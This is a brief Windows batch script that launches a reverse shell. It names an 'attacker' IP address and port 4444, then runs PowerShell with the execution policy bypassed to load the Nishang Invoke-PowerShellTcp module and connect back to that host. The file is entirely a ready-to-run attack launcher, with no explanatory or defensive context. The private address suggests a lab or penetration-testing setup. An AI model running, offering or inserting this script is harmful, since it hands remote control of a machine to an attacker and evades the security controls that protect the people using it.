@echo off
setlocal

rem Set the attacker IP address and port
set "attacker_ip=192.168.231.135"
set "port=4444"

cd E:\nishang-master\nishang-master

powershell -ExecutionPolicy Bypass -NoProfile -Command "Import-Module .\Shells\Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress %attacker_ip% -Port %port%"